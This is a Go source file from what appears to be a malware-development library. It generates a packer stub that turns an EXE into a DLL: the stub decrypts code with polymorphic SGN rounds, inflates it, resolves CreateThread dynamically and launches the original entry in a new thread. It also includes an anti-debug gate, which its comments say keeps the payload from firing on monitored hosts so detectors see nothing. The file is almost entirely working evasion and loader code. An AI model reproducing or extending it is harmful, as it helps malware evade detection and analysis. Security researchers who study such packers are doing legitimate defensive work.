package stage1

import (
	"encoding/binary"
	"errors"
	"fmt"

	"github.com/oioio-space/maldev/encode"
	"github.com/oioio-space/maldev/pe/packer/stubgen/amd64"
	"github.com/oioio-space/maldev/pe/packer/stubgen/poly"
	"github.com/oioio-space/maldev/pe/packer/transform"
)

// Trailing-data sizes for the converted-DLL stub.
const (
	// convertedDLLNULTermBytes is the 2-byte UTF-16 NUL terminator
	// appended after the wide-args buffer when DefaultArgs is set.
	convertedDLLNULTermBytes = 2
	// convertedDLLFlagByteSize is the 1-byte decrypted_flag latch
	// emitted at the very end of the stub (offset stub_size-1).
	convertedDLLFlagByteSize = 1
)

// Frame sizes for the converted-DLL stub. Both keep RSP 16-aligned
// (Windows x64 ABI requirement before any CALL): the outer frame
// holds the 4 register spills (rcx/rdx/r8/r15 = 32 B) plus 16 B
// alignment pad; the inner frame allocated around CreateThread
// holds 32 B shadow space + 16 B for the two stack-passed args.
const (
	// convertedDLLFrameSize covers the 4 shared spill slots (rcx, rdx,
	// r8, r15 = 32 B) plus 6 extra callee-saved spills (rbx, rdi, rsi,
	// r12, r13, r14 = 48 B) plus 16 B alignment pad. The Win64 ABI
	// requires DllMain to preserve all callee-saved GPRs (RBX, RBP,
	// RDI, RSI, R12-R15) across the call — RBP is handled by the
	// `push rbp` in the shared prologue, R15 by the slot list. The
	// rest must be saved here because the SGN poly engine and the
	// kernel32 resolver clobber RBX, R12 (+ work-clobber R13, R14).
	// Without these spills the loader observes corrupted non-volatile
	// state on return → ERROR_DLL_INIT_FAILED even with RAX=1.
	// Slice 5.5.y root-cause.
	convertedDLLFrameSize     = 0x60 // 4 + 6 spills (80 B) + 16 B pad
	createThreadCallFrameSize = 0x30 // 32 B shadow + 16 B for 5th/6th args
)

// convertedExtraSpills lists the callee-saved registers the shared
// prologue/restore does NOT handle but the converted-DLL stub must
// still preserve. Slots are addressed [rbp - disp]; disps start
// past the shared spill range (0x20) and grow downward.
var convertedExtraSpills = []struct {
	reg  amd64.Reg
	disp int32
	name string
}{
	{amd64.RBX, -0x28, "rbx"},
	{amd64.RDI, -0x30, "rdi"},
	{amd64.RSI, -0x38, "rsi"},
	{amd64.R12, -0x40, "r12"},
	{amd64.R13, -0x48, "r13"},
	{amd64.R14, -0x50, "r14"},
}

// ErrConvertedDLLPlanMissing fires when [EmitConvertedDLLStub] is
// called with a Plan that doesn't have IsConvertedDLL=true.
// Mirrors the slice-2 [ErrDLLStubPlanMissing] check; routing the
// wrong plan through the converted-DLL emitter would produce a
// stub whose CreateThread spawn would land on bogus bytes.
var ErrConvertedDLLPlanMissing = errors.New("stage1: EmitConvertedDLLStub requires Plan.IsConvertedDLL=true")

// EmitConvertedDLLStub writes a DllMain-shaped stub for the EXE→DLL
// conversion path. Layout differs from [EmitDLLStub] (the native-DLL
// stub) in three ways:
//
//   - There is NO tail-call to an original DllMain. The input was an
//     EXE, so its entry point is `int main(int, char**)`-shaped, not
//     `BOOL DllMain(HINSTANCE, DWORD, LPVOID)`-shaped. We spawn a
//     fresh thread targeting that entry instead.
//   - The thread is spawned via `kernel32!CreateThread`, resolved
//     at runtime by [EmitResolveKernel32Export] (no IAT entry, no
//     LoadLibraryA dependency). On DLL_PROCESS_ATTACH the stub
//     decrypts .text once, calls CreateThread on the original OEP,
//     and returns TRUE to the loader. The thread runs in parallel
//     to whatever the host EXE that loaded us is doing.
//   - Trailing data is just one byte (the decrypted_flag). The
//     native-DLL stub also carries an 8-byte orig_dllmain slot —
//     we don't need one because there's nothing to tail-call.
//
// On reasons other than PROCESS_ATTACH (THREAD_*, PROCESS_DETACH),
// the stub returns TRUE immediately without decrypting or spawning.
//
// Slice 5.3 of docs/refactor-2026-doc/packer-exe-to-dll-plan.md.
func EmitConvertedDLLStub(b *amd64.Builder, plan transform.Plan, rounds []poly.Round, opts EmitOptions) error {
	if !plan.IsConvertedDLL {
		return ErrConvertedDLLPlanMissing
	}
	if len(rounds) == 0 {
		return ErrNoRounds
	}

	// Anti-debug runs BEFORE the prologue so a positive detection exits
	// via the bare RET emitted by emitAntiDebugWindowsPE — the stack is
	// still exactly as the loader left it (no frame setup yet), and RAX
	// carries a non-zero check result (BeingDebugged byte, NtGlobalFlag
	// mask, or RDTSC delta — all positive on detection). Loader reads
	// RAX as BOOL TRUE → DllMain "succeeded" → DLL loads silently
	// without ever decrypting or spawning. Detector sees nothing
	// suspicious; payload simply doesn't fire on monitored hosts.
	// Slice 5.6 of docs/refactor-2026-doc/packer-exe-to-dll-plan.md.
	if opts.AntiDebug {
		if err := emitAntiDebug(b, plan.Format); err != nil {
			return fmt.Errorf("stage1/converted: antidebug: %w", err)
		}
	}

	// --- prologue: stack frame + spill rcx/edx/r8/r15 (shared helper) ---
	if err := emitDllMainPrologue(b, convertedDLLFrameSize, "stage1/converted"); err != nil {
		return err
	}

	// Spill the remaining callee-saved GPRs into slots beyond the
	// shared spill range. See convertedExtraSpills doc for why.
	for _, s := range convertedExtraSpills {
		if err := b.MOV(amd64.MemOp{Base: amd64.RBP, Disp: s.disp}, s.reg); err != nil {
			return fmt.Errorf("stage1/converted: spill %s: %w", s.name, err)
		}
	}

	// --- CALL+POP+ADD: R15 := textRVA at runtime (shared idiom) ---
	if err := emitTextBasePrologue(b); err != nil {
		return fmt.Errorf("stage1/converted: text-base prologue: %w", err)
	}

	// --- reason != DLL_PROCESS_ATTACH → forward (return TRUE) ---
	const returnTrueLabel = "converted_dll_return_true"
	if err := b.CMP(amd64.RDX, amd64.Imm(dllReasonProcessAttach)); err != nil {
		return fmt.Errorf("stage1/converted: cmp reason: %w", err)
	}
	if err := b.JNZ(amd64.LabelRef(returnTrueLabel)); err != nil {
		return fmt.Errorf("stage1/converted: jnz return_true (reason): %w", err)
	}

	// --- decrypted_flag check + latch ---
	// Trailing data layout: stubBytes[len-1] = decrypted_flag (1B).
	// PatchConvertedDLLStubDisplacements rewrites flagDispSentinel
	// with the R15-relative disp once the stub byte layout is final.
	if err := b.MOVZX(amd64.RAX, amd64.MemOp{Base: amd64.R15, Disp: int32(flagDispSentinel)}); err != nil {
		return fmt.Errorf("stage1/converted: movzx flag: %w", err)
	}
	if err := b.TEST(amd64.RAX, amd64.RAX); err != nil {
		return fmt.Errorf("stage1/converted: test flag: %w", err)
	}
	if err := b.JNZ(amd64.LabelRef(returnTrueLabel)); err != nil {
		return fmt.Errorf("stage1/converted: jnz return_true (flag): %w", err)
	}
	if err := b.MOV(amd64.RAX, amd64.Imm(1)); err != nil {
		return fmt.Errorf("stage1/converted: mov al,1: %w", err)
	}
	if err := b.MOVB(amd64.MemOp{Base: amd64.R15, Disp: int32(flagDispSentinel)}, amd64.RAX); err != nil {
		return fmt.Errorf("stage1/converted: movb flag,al: %w", err)
	}

	// Slice 5.5.y diagnostic: skip SGN + resolver + CreateThread
	// entirely (dead-code-free) so we can verify the prologue +
	// flag latch + return-TRUE path in isolation. The diagnostic
	// gate covers everything from the SGN rounds to the
	// CreateThread call below — falls through to the returnTrue
	// label anchor.
	if !opts.DiagSkipConvertedPayload {
		// SGN rounds — shared with EmitStub / EmitDLLStub.
		if err := emitSGNRounds(b, plan, rounds, "converted_loop", "stage1/converted"); err != nil {
			return err
		}

		// LZ4 inflate — mirrors the EXE-stub block in EmitStub. After
		// SGN rounds, [R15, R15+CompressedSize) holds the LZ4 block;
		// inflate into the scratch buffer in the stub segment's BSS
		// slack (R15+ScratchDispFromText), then rep-movsb plaintext
		// back to R15. EmitLZ4InflateInline internally preserves
		// RBX/R12; RSI/RDI used by the memcpy are spilled by the
		// converted-DLL prologue. Slice 5.7 of
		// docs/refactor-2026-doc/packer-exe-to-dll-plan.md.
		if opts.Compress {
			if opts.CompressedSize == 0 || opts.OriginalSize == 0 || opts.ScratchDispFromText == 0 {
				return fmt.Errorf("stage1/converted: Compress=true but CompressedSize=%d OriginalSize=%d ScratchDispFromText=%d",
					opts.CompressedSize, opts.OriginalSize, opts.ScratchDispFromText)
			}
			// LZ4 register setup: RAX=src (R15), RBX=dst (scratch), RCX=srcSize.
			if err := b.MOV(amd64.RAX, baseReg); err != nil {
				return fmt.Errorf("stage1/converted: lz4 setup MOV RAX,R15: %w", err)
			}
			if err := b.LEA(amd64.RBX, amd64.MemOp{Base: baseReg, Disp: opts.ScratchDispFromText}); err != nil {
				return fmt.Errorf("stage1/converted: lz4 setup LEA RBX,scratch: %w", err)
			}
			if err := b.MOV(amd64.RCX, amd64.Imm(int64(opts.CompressedSize))); err != nil {
				return fmt.Errorf("stage1/converted: lz4 setup MOV RCX,size: %w", err)
			}
			if err := EmitLZ4InflateInline(b); err != nil {
				return fmt.Errorf("stage1/converted: lz4 inflate: %w", err)
			}
			// memcpy plaintext back to R15: cld; rsi=scratch; rdi=R15;
			// rcx=OriginalSize; rep movsb.
			if err := b.RawBytes([]byte{0xfc}); err != nil { // cld
				return fmt.Errorf("stage1/converted: memcpy CLD: %w", err)
			}
			if err := b.MOV(amd64.RSI, amd64.RBX); err != nil {
				return fmt.Errorf("stage1/converted: memcpy MOV RSI,RBX: %w", err)
			}
			if err := b.MOV(amd64.RDI, baseReg); err != nil {
				return fmt.Errorf("stage1/converted: memcpy MOV RDI,R15: %w", err)
			}
			if err := b.MOV(amd64.RCX, amd64.Imm(int64(opts.OriginalSize))); err != nil {
				return fmt.Errorf("stage1/converted: memcpy MOV RCX,OriginalSize: %w", err)
			}
			if err := b.RawBytes([]byte{0xf3, 0xa4}); err != nil { // rep movsb
				return fmt.Errorf("stage1/converted: memcpy REP MOVSB: %w", err)
			}
		}
	}

	// Resolver + PEB patch + CreateThread spawn — emitted via the
	// shared helper. Trailing-data args descriptor is only set when
	// DefaultArgs is non-empty; nil means "skip PEB patch".
	var defaultArgsBytes []byte
	var spawnArgs convertedSpawnArgs
	if opts.convertedSpawnEnabled() && opts.DefaultArgs != "" {
		defaultArgsBytes = encode.ToUTF16LE(opts.DefaultArgs)
		spawnArgs = convertedSpawnArgsTrailing{lenBytes: uint16(len(defaultArgsBytes))}
	}
	if err := emitConvertedSpawnBlock(b, plan, opts, spawnArgs); err != nil {
		return err
	}

	// --- return TRUE: restore args + r15, leave rax=1 ---
	_ = b.Label(returnTrueLabel)
	// rax = 1 (BOOL TRUE)
	if err := b.MOV(amd64.RAX, amd64.Imm(1)); err != nil {
		return fmt.Errorf("stage1/converted: mov rax,1: %w", err)
	}
	// Restore the extra callee-saved GPRs before the shared restore
	// tears the frame down. Order doesn't matter — each slot is
	// independent — so we mirror the spill order for readability.
	for _, s := range convertedExtraSpills {
		if err := b.MOV(s.reg, amd64.MemOp{Base: amd64.RBP, Disp: s.disp}); err != nil {
			return fmt.Errorf("stage1/converted: restore %s: %w", s.name, err)
		}
	}

	// restore spilled args + r15, tear down frame (shared helper)
	if err := emitDllMainRestore(b, convertedDLLFrameSize, "stage1/converted"); err != nil {
		return err
	}
	if err := b.RawBytes([]byte{0xC3}); err != nil { // ret
		return fmt.Errorf("stage1/converted: ret: %w", err)
	}

	// Optional RunWithArgs export body — emitted between the DllMain
	// epilogue and the trailing data so the wide-args buffer + flag
	// byte stay at the end (preserves ConvertedDLLStub*OffsetFromEnd
	// contracts). The entry has its own 8-byte INT3 sentinel that
	// PatchConvertedDLLRunWithArgsEntry locates after encode.
	if opts.RunWithArgs {
		if err := EmitConvertedDLLRunWithArgsEntry(b, plan, opts); err != nil {
			return fmt.Errorf("stage1/converted: run-with-args entry: %w", err)
		}
	}

	// Trailing data layout (from the end of the stub):
	//   [args (N bytes UTF-16LE)][NUL (2 B)][flag (1 B)]
	// Args + NUL only emitted when DefaultArgs is set. Flag stays
	// at offset stub_size-1 either way — matches the existing
	// ConvertedDLLStubFlagByteOffsetFromEnd contract.
	if len(defaultArgsBytes) > 0 {
		if err := b.RawBytes(append(defaultArgsBytes, 0x00, 0x00)); err != nil {
			return fmt.Errorf("stage1/converted: emit args buffer + NUL: %w", err)
		}
	}
	if err := b.RawBytes([]byte{0x00}); err != nil {
		return fmt.Errorf("stage1/converted: emit decrypted_flag byte: %w", err)
	}

	return nil
}

// ConvertedDLLStubArgsBufferOffsetFromEnd is the byte offset of
// the wide-args buffer's first byte counted from the end of the
// emitted stub, when EmitOptions.DefaultArgs is set. Caller uses
// this to compute the args-buffer-disp value for
// PatchPEBCommandLineDisp.
func ConvertedDLLStubArgsBufferOffsetFromEnd(argsBytes int) int {
	return argsBytes + convertedDLLNULTermBytes + convertedDLLFlagByteSize
}

// ConvertedDLLStubFlagByteOffsetFromEnd is the position of the
// decrypted_flag byte counted from the end of the emitted stub.
// Trailing data is just that one byte (the slice-2 DLL stub also
// carries an 8-byte orig_dllmain slot — the converted-DLL stub
// doesn't, because there is no original DllMain to tail-call).
const ConvertedDLLStubFlagByteOffsetFromEnd = 1

// PatchConvertedDLLStubDisplacements rewrites the [flagDispSentinel]
// imm32 in the emitted stub bytes with the real R15-relative
// displacement once the trailing-data offset is known.
//
// The flag byte sits at stubBytes[len-1]. Its R15-relative disp is
// `(StubRVA + flagOff) - TextRVA` where flagOff = len(stubBytes)-1.
// The sentinel appears twice in the assembled stub (one MOVZX load
// + one MOVB store, same byte addressed twice); both occurrences
// are rewritten with the same value.
//
// Returns the patched count (≥ 2). Missing sentinel is an error.
func PatchConvertedDLLStubDisplacements(stubBytes []byte, plan transform.Plan) (int, error) {
	if len(stubBytes) < ConvertedDLLStubFlagByteOffsetFromEnd {
		return 0, fmt.Errorf("stage1/converted: stub too short (%d B) — missing trailing data", len(stubBytes))
	}
	flagOff := uint32(len(stubBytes) - ConvertedDLLStubFlagByteOffsetFromEnd)
	flagDisp := uint32(int32(plan.StubRVA+flagOff) - int32(plan.TextRVA))

	needle := binary.LittleEndian.AppendUint32(nil, flagDispSentinel)
	value := binary.LittleEndian.AppendUint32(nil, flagDisp)
	_, count, err := patchSentinel(stubBytes, needle, value, true, "converted DLL flag disp")
	return count, err
}
